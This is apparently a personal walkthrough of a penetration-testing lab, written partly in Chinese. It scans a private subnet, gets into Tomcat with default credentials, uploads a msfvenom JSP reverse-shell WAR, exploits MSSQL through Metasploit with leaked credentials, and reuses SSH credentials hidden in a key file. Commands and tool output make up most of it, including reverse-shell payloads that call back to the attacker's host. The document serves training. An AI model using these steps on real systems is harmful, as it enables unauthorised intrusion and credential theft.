.10是kali
```
┌──(root💀kali)-[/home/kali/Desktop]
└─# nmap -Pn 172.16.64.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-04 09:57 EDT
Nmap scan report for 172.16.64.101
Host is up (0.37s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
9080/tcp open  glrpc
MAC Address: 00:50:56:A2:0E:1A (VMware)

Nmap scan report for 172.16.64.140
Host is up (0.26s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:A2:AA:64 (VMware)

Nmap scan report for 172.16.64.182
Host is up (0.40s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:50:56:A2:4D:04 (VMware)

Nmap scan report for 172.16.64.199
Host is up (0.31s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
MAC Address: 00:50:56:A2:C7:D7 (VMware)

Nmap scan report for 172.16.64.10
Host is up (0.0000040s latency).
All 1000 scanned ports on 172.16.64.10 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (5 hosts up) scanned in 81.05 seconds
```
一開始只有http://172.16.64.101:8080/可以訪問
```
┌──(root💀kali)-[/home/kali/Desktop]
└─# nmap -sC -sV  -p 8080 172.16.64.101                                                     130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-04 10:18 EDT
Nmap scan report for 172.16.64.101
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
MAC Address: 00:50:56:A2:0E:1A (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds

┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://172.16.64.101:8080/ -t 64 -w /usr/share/dirb/wordlists/common.txt -x ht
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.64.101:8080/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,htm,asp,php
[+] Timeout:                 10s
===============================================================
2022/05/04 10:12:32 Starting gobuster in directory enumeration mode
===============================================================
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/index.html           (Status: 200) [Size: 11321]                 
/index.html           (Status: 200) [Size: 11321]                 
/manager              (Status: 302) [Size: 0] [--> /manager/]     
                                                                  
===============================================================
2022/05/04 10:14:36 Finished
===============================================================

```
訪問`http://172.16.64.101:8080/manager/html`需要輸入username/pass試了 admin/admin root/root 無法進入 所以google
`apache /manager/html username`                        
https://stackoverflow.com/questions/43232878/apache-tomcat-9-unable-to-access-manager-webapp username="tomcat" password="s3cret" 
```
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=8787 -f war > shell.war
Payload size: 1105 bytes
Final size of war file: 1105 bytes

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL                   no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 172.16.64.10
lhost => 172.16.64.10
msf6 exploit(multi/handler) > set lport 8787
lport => 8787
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.64.10:8787 
[*] Command shell session 1 opened (172.16.64.10:8787 -> 172.16.64.101:34222 ) at 2022-05-04 10:30:45 -0400

whoami
tomcat8

```

接下來換140的機器，用gobuster掃描出錯了 所以換dirb         
發現project 然後可以admin/admin 所以登入後再繼續掃發現/project/backup
```
┌──(kali㉿kali)-[~/Desktop]
└─$ dirb http://172.16.64.140/       

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May  4 10:38:17 2022
URL_BASE: http://172.16.64.140/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.64.140/ ----
==> DIRECTORY: http://172.16.64.140/css/                                                         
==> DIRECTORY: http://172.16.64.140/img/                                                         
+ http://172.16.64.140/index.html (CODE:200|SIZE:1487)                                           
+ http://172.16.64.140/project (CODE:401|SIZE:460)                                               
^C> Testing: http://172.16.64.140/pureadmin          


┌──(root💀kali)-[/home/kali/Desktop]
└─# dirb http://172.16.64.140/project/ -u admin:admin                                         1 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May  4 10:47:25 2022
URL_BASE: http://172.16.64.140/project/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
AUTHORIZATION: admin:admin

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.64.140/project/ ----
==> DIRECTORY: http://172.16.64.140/project/backup/                                              
^C> Testing: http://172.16.64.140/project/boiler             
```
發現mssql 和uid/pwd 去試試看
```
http://172.16.64.140/project/backup/test/dsadasda.txt
#MSSQL Connection string



http://172.16.64.140/project/backup/test/sdadas.txt

Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
/var/www/html/project/354253425234234/flag.txt

```

```
msf6 > search exploit mssql

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/windows/misc/ais_esel_server_rce                  2019-03-27       excellent  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
   1   auxiliary/gather/billquick_txtid_sqli                     2021-10-22       normal     Yes    BillQuick Web Suite txtID SQLi
   2   exploit/windows/mssql/lyris_listmanager_weak_pass         2005-12-08       excellent  No     Lyris ListManager MSDE Weak sa Password
   3   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       Yes    MS02-039 Microsoft SQL Server Resolution Overflow
   4   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       Yes    MS02-056 Microsoft SQL Server Hello Overflow
   5   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
   6   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
   7   exploit/windows/iis/msadc                                 1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   8   exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
   9   exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   10  exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Yes    Microsoft SQL Server Payload Execution
   11  exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
   12  exploit/windows/http/plesk_mylittleadmin_viewstate        2020-05-15       excellent  Yes    Plesk/myLittleAdmin ViewState .NET Deserialization


Interact with a module by name or index. For example info 12, use 12 or use exploit/windows/http/plesk_mylittleadmin_viewstate                                                                      

msf6 > use 10
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_payload) > show option
[-] Invalid parameter "option", use "show -h" for more information
msf6 exploit(windows/mssql/mssql_payload) > show options

Module options (exploit/windows/mssql/mssql_payload):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   METHOD               cmd              yes       Which payload delivery method to use (ps, cmd
                                                   , or old)
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://github.com/ra
                                                   pid7/metasploit-framework/wiki/Using-Metasplo
                                                   it
   RPORT                1433             yes       The target port (TCP)
   SRVHOST              0.0.0.0          yes       The local host or network interface to listen
                                                    on. This must be an address on the local mac
                                                   hine or 0.0.0.0 to listen on all addresses.
   SRVPORT              8080             yes       The local port to listen on.
   SSL                  false            no        Negotiate SSL for incoming connections
   SSLCert                               no        Path to a custom SSL certificate (default is
                                                   randomly generated)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   URIPATH                               no        The URI to use for this exploit (default is r
                                                   andom)
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN
                                                    option set)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none
                                        )
   LHOST     192.168.0.30     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/mssql/mssql_payload) > set PassWORD fooadmin
PassWORD => fooadmin
msf6 exploit(windows/mssql/mssql_payload) > set rhost 172.16.64.199
rhost => 172.16.64.199
msf6 exploit(windows/mssql/mssql_payload) > set username fooadmin
username => fooadmin
msf6 exploit(windows/mssql/mssql_payload) > set lhost 172.16.64.10
lhost => 172.16.64.10
msf6 exploit(windows/mssql/mssql_payload) > run

```
root 進去之後在desktop下找到flag和id_rsa
```
meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Users\AdminELS\Desktop
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  853   fil   2019-03-12 08:31:52 -0400  HeidiSQL.lnk
100666/rw-rw-rw-  282   fil   2017-12-15 17:42:58 -0500  desktop.ini
100666/rw-rw-rw-  47    fil   2019-04-25 02:39:16 -0400  flag.txt
100666/rw-rw-rw-  632   fil   2019-05-18 13:03:09 -0400  id_rsa.pub

meterpreter > cat flag.txt 
Congratulations! You exploited this machine! 
meterpreter > cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################meterpreter > 
meterpreter > download id_rsa.pub 
[*] Downloading: id_rsa.pub -> /home/kali/Desktop/id_rsa.pub
[*] Downloaded 632.00 B of 632.00 B (100.0%): id_rsa.pub -> /home/kali/Desktop/id_rsa.pub
[*] download   : id_rsa.pub -> /home/kali/Desktop/id_rsa.pub

```
# ssh    
觀察之後他長得有點古怪，在後面發現ssh://developer:dF3334slKw@172.16.64.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh developer@172.16.64.182
The authenticity of host '172.16.64.182 (172.16.64.182)' can't be established.
ED25519 key fingerprint is SHA256:db12Ro4954nudE671ZUroF90g3iX6NyJ+r+X+PBapQQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.64.182' (ED25519) to the list of known hosts.
developer@172.16.64.182's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

195 packages can be updated.
10 updates are security updates.

Last login: Sun May 19 05:36:41 2019 from 172.16.64.13
developer@xubuntu:~$ 
developer@xubuntu:~$ sudo -l
[sudo] password for developer: 
Sorry, user developer may not run sudo on xubuntu.
developer@xubuntu:~$ sudo su
[sudo] password for developer: 
developer is not in the sudoers file.  This incident will be reported.
developer@xubuntu:~$ ls
flag.txt
developer@xubuntu:~$ cat flag
cat: flag: No such file or directory
developer@xubuntu:~$ cat flag.txt 
Congratulations, you got it!
developer@xubuntu:~$ 


```